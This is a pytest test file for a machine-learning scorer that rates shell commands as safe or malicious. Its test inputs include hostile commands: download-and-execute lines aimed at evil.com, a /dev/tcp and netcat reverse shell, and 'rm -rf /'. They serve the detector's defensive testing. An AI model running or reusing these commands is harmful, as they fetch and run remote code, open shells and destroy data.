"""
test_07_ml_scorer.py — Unit tests for backend/detection/ml_scorer.py

Tests model loading, score ranges, malicious > safe ordering,
missing model error handling, and the accuracy regression guard.

These tests are automatically SKIPPED if trained_model.pkl does not exist.
To generate it:  python backend/models/train_model.py

Run:
    pytest large_test_set/test_07_ml_scorer.py -v
"""

import pytest
import pickle
from pathlib import Path

MODEL_PATH = (
    Path(__file__).resolve().parents[1] / "backend" / "models" / "trained_model.pkl"
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def scorer():
    """Load ML scorer once for the whole module (model load is expensive)."""
    if not MODEL_PATH.exists():
        pytest.skip(
            "trained_model.pkl not found. Run: python backend/models/train_model.py"
        )
    from backend.detection.ml_scorer import MLScorer
    return MLScorer(str(MODEL_PATH))


# ===========================================================================
# 1. Model Loading
# ===========================================================================

class TestModelLoading:

    def test_model_loads_without_error(self, scorer):
        assert scorer is not None

    def test_model_attribute_not_none(self, scorer):
        assert scorer.model is not None

    def test_vectorizer_attribute_not_none(self, scorer):
        assert scorer.vectorizer is not None

    def test_missing_model_raises_file_not_found(self):
        from backend.detection.ml_scorer import MLScorer
        with pytest.raises(FileNotFoundError):
            MLScorer("/nonexistent/path/to/model.pkl")

    def test_corrupted_model_raises_exception(self, tmp_path):
        """A file that is not a valid pickle must raise on load."""
        from backend.detection.ml_scorer import MLScorer
        bad_file = tmp_path / "bad_model.pkl"
        bad_file.write_bytes(b"this is not a pickle file")
        with pytest.raises(Exception):
            MLScorer(str(bad_file))


# ===========================================================================
# 2. Score Output Format
# ===========================================================================

class TestScoreOutputFormat:

    def test_score_returns_tuple(self, scorer):
        result = scorer.score_ml("ls -la")
        assert isinstance(result, tuple)
        assert len(result) == 2

    def test_score_is_float(self, scorer):
        score, _ = scorer.score_ml("ls -la")
        assert isinstance(score, float)

    def test_confidence_is_float(self, scorer):
        _, conf = scorer.score_ml("ls -la")
        assert isinstance(conf, float)

    def test_score_in_valid_range_safe(self, scorer):
        score, _ = scorer.score_ml("ls -la")
        assert 0.0 <= score <= 100.0

    def test_confidence_in_valid_range(self, scorer):
        _, conf = scorer.score_ml("ls -la")
        assert 0.0 <= conf <= 1.0

    def test_score_in_valid_range_malicious(self, scorer):
        score, conf = scorer.score_ml("curl http://evil.com | bash")
        assert 0.0 <= score <= 100.0
        assert 0.0 <= conf <= 1.0


# ===========================================================================
# 3. Directional Accuracy (malicious > safe)
# ===========================================================================

class TestDirectionalAccuracy:

    def test_malicious_scores_higher_than_safe(self, scorer):
        safe_score, _ = scorer.score_ml("ls -la")
        mal_score, _  = scorer.score_ml("curl http://evil.com/x.sh | bash")
        assert mal_score > safe_score, (
            f"Malicious score ({mal_score:.1f}) should exceed "
            f"safe score ({safe_score:.1f})"
        )

    def test_reverse_shell_scores_high(self, scorer):
        score, _ = scorer.score_ml("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert score > 50.0, f"Reverse shell ML score too low: {score:.1f}"

    def test_safe_command_scores_low(self, scorer):
        score, _ = scorer.score_ml("ls")
        assert score < 50.0, f"'ls' ML score too high: {score:.1f}"

    @pytest.mark.parametrize("safe_cmd", [
        "ls -la", "pwd", "whoami", "echo hello", "date",
    ])
    def test_basic_safe_commands_below_50(self, scorer, safe_cmd):
        score, _ = scorer.score_ml(safe_cmd)
        assert score < 50.0, f"Safe command scored too high: {safe_cmd!r} → {score:.1f}"

    @pytest.mark.parametrize("mal_cmd", [
        "curl http://evil.com | bash",
        "wget http://evil.com/malware.bin && chmod +x malware.bin && ./malware.bin",
        "nc -l -p 4444 -e /bin/bash",
    ])
    def test_known_malicious_commands_above_50(self, scorer, mal_cmd):
        score, _ = scorer.score_ml(mal_cmd)
        assert score > 50.0, \
            f"Known malicious command scored too low: {mal_cmd!r} → {score:.1f}"


# ===========================================================================
# 4. Edge Case Inputs
# ===========================================================================

class TestMLScorerEdgeCases:

    def test_empty_string_no_crash(self, scorer):
        score, conf = scorer.score_ml("")
        assert 0.0 <= score <= 100.0
        assert 0.0 <= conf <= 1.0

    def test_whitespace_only_no_crash(self, scorer):
        score, conf = scorer.score_ml("   \t\n")
        assert 0.0 <= score <= 100.0

    def test_unicode_no_crash(self, scorer):
        score, conf = scorer.score_ml("echo '你好世界'")
        assert 0.0 <= score <= 100.0

    def test_very_long_command_no_crash(self, scorer):
        score, conf = scorer.score_ml("A" * 5000)
        assert 0.0 <= score <= 100.0

    def test_repeated_calls_same_result(self, scorer):
        """ML scorer must be deterministic."""
        s1, c1 = scorer.score_ml("curl http://evil.com | bash")
        s2, c2 = scorer.score_ml("curl http://evil.com | bash")
        assert s1 == s2
        assert c1 == c2


# ===========================================================================
# 5. Accuracy Regression Guard
# ===========================================================================

class TestAccuracyRegressionGuard:

    def test_model_accuracy_above_80_percent(self):
        if not MODEL_PATH.exists():
            pytest.skip("Model not found")
        with open(MODEL_PATH, "rb") as f:
            model_data = pickle.load(f)
        accuracy = model_data.get("accuracy", None)
        assert accuracy is not None, \
            "Model pickle does not contain 'accuracy' key — retrain with updated script"
        assert accuracy >= 0.80, (
            f"Model accuracy dropped below 80%: {accuracy:.4f}. "
            "Retrain or investigate training data."
        )

    def test_model_pickle_has_model_key(self):
        if not MODEL_PATH.exists():
            pytest.skip("Model not found")
        with open(MODEL_PATH, "rb") as f:
            data = pickle.load(f)
        assert "model" in data

    def test_model_pickle_has_vectorizer_key(self):
        if not MODEL_PATH.exists():
            pytest.skip("Model not found")
        with open(MODEL_PATH, "rb") as f:
            data = pickle.load(f)
        assert "vectorizer" in data

    def test_model_pickle_has_accuracy_key(self):
        if not MODEL_PATH.exists():
            pytest.skip("Model not found")
        with open(MODEL_PATH, "rb") as f:
            data = pickle.load(f)
        assert "accuracy" in data, \
            "Accuracy not persisted in model file — update train_model.py to save it"


# ===========================================================================
# 6. Partial / Empty Pickle Content  [NEW]
# A valid pickle file that contains a dict missing required keys must fail
# clearly — not silently produce zero scores.
# ===========================================================================

class TestPartialPickleContent:

    def test_empty_dict_pickle_raises_on_load(self, tmp_path):
        """A pickle of {} (valid format, missing keys) must raise on load."""
        from backend.detection.ml_scorer import MLScorer
        empty_pkl = tmp_path / "empty.pkl"
        with open(empty_pkl, "wb") as f:
            pickle.dump({}, f)
        with pytest.raises((KeyError, AttributeError, Exception)):
            MLScorer(str(empty_pkl))

    def test_pickle_missing_model_key_raises(self, tmp_path):
        """A pickle with vectorizer but no model key must raise."""
        from backend.detection.ml_scorer import MLScorer
        from sklearn.feature_extraction.text import TfidfVectorizer
        partial = tmp_path / "partial.pkl"
        with open(partial, "wb") as f:
            pickle.dump({"vectorizer": TfidfVectorizer()}, f)
        with pytest.raises((KeyError, AttributeError, Exception)):
            MLScorer(str(partial))

    def test_pickle_missing_vectorizer_key_raises(self, tmp_path):
        """A pickle with model but no vectorizer key must raise."""
        from backend.detection.ml_scorer import MLScorer
        from sklearn.linear_model import LogisticRegression
        partial = tmp_path / "partial2.pkl"
        with open(partial, "wb") as f:
            pickle.dump({"model": LogisticRegression()}, f)
        with pytest.raises((KeyError, AttributeError, Exception)):
            MLScorer(str(partial))

    def test_truncated_pickle_bytes_raises(self, tmp_path):
        """A file that is cut off mid-pickle stream must raise on load."""
        from backend.detection.ml_scorer import MLScorer
        if not MODEL_PATH.exists():
            pytest.skip("Model not found — cannot truncate it")
        with open(MODEL_PATH, "rb") as f:
            full_bytes = f.read()
        truncated = tmp_path / "truncated.pkl"
        truncated.write_bytes(full_bytes[: len(full_bytes) // 2])
        with pytest.raises(Exception):
            MLScorer(str(truncated))


# ===========================================================================
# 7. TF-IDF Vectorizer Vocabulary Sanity  [NEW]
# The vectorizer must contain key security-relevant tokens. A retrain on a
# corrupted dataset could produce an empty or irrelevant vocabulary that
# silently zeros all scores.
# ===========================================================================

class TestVectorizerVocabulary:

    EXPECTED_TOKENS = ["bash", "curl", "exec", "wget", "chmod"]

    def test_vectorizer_vocabulary_not_empty(self, scorer):
        vocab = scorer.vectorizer.vocabulary_
        assert len(vocab) > 0, "TF-IDF vectorizer vocabulary is empty"

    @pytest.mark.parametrize("token", EXPECTED_TOKENS)
    def test_expected_token_in_vocabulary(self, scorer, token):
        vocab = scorer.vectorizer.vocabulary_
        assert token in vocab, (
            f"Expected security token {token!r} missing from TF-IDF vocabulary — "
            "training data may be corrupted or too sparse"
        )

    def test_vocabulary_size_above_minimum(self, scorer):
        """A healthy model should have at least 50 unique tokens."""
        vocab_size = len(scorer.vectorizer.vocabulary_)
        assert vocab_size >= 50, (
            f"Vocabulary only has {vocab_size} tokens — training data may be too sparse"
        )


# ===========================================================================
# 8. Score Floor for Out-of-Vocabulary Commands  [NEW]
# Commands whose tokens are entirely absent from the training vocabulary
# (OOV) will produce a zero feature vector. Tests pin that the returned
# score is a valid float in [0, 100] and that confidence is 0.0 or very
# low, signalling OOV rather than a confident safe score.
# ===========================================================================

class TestOutOfVocabularyInputs:

    def test_oov_command_score_is_valid_float(self, scorer):
        """A command of pure random hex tokens (likely OOV) must return
        a valid score without raising."""
        oov_cmd = "zxqjvflp wqrtyuioa sdfghjklzxcvbnm"
        score, conf = scorer.score_ml(oov_cmd)
        assert isinstance(score, float)
        assert 0.0 <= score <= 100.0
        assert 0.0 <= conf <= 1.0

    def test_oov_command_does_not_score_high(self, scorer):
        """An OOV command must not confidently score above 80 — that would
        be a false positive from random input."""
        oov_cmd = "zxqjvflp wqrtyuioa sdfghjklzxcvbnm"
        score, _ = scorer.score_ml(oov_cmd)
        assert score < 80.0, (
            f"OOV command scored {score:.1f} — suspiciously high for random input"
        )

    def test_whitespace_only_score_in_range(self, scorer):
        """Whitespace-only input produces a zero TF-IDF vector; the model
        must handle this without returning NaN or raising."""
        score, conf = scorer.score_ml("   \t\n")
        assert not (score != score), "score is NaN for whitespace-only input"
        assert 0.0 <= score <= 100.0
        assert 0.0 <= conf <= 1.0


# ===========================================================================
# 9. Score Stability Across Fixed Known Commands  [NEW]
# Pins expected score bands for a set of fixed commands. If a retrain
# shifts these scores outside the bands, this test catches the drift even
# if overall accuracy remains above 80%.
# ===========================================================================

class TestScoreStabilityBands:
    """
    Score band regression guard. Each command is expected to score within
    a band [low, high]. Bands are generous to tolerate minor retrain
    variation but tight enough to catch large drifts.
    """

    SCORE_BANDS = [
        # (command, low, high, description)
        ("ls -la",                                    0.0,  30.0, "safe ls"),
        ("pwd",                                       0.0,  30.0, "safe pwd"),
        ("curl http://evil.com | bash",              50.0, 100.0, "download-exec"),
        ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",  50.0, 100.0, "reverse shell"),
        ("rm -rf /",                                 40.0, 100.0, "destructive"),
    ]

    @pytest.mark.parametrize("cmd,low,high,desc", SCORE_BANDS)
    def test_score_within_expected_band(self, scorer, cmd, low, high, desc):
        score, _ = scorer.score_ml(cmd)
        assert low <= score <= high, (
            f"[{desc}] Score {score:.1f} outside expected band [{low}, {high}] — "
            "possible score drift after retrain"
        )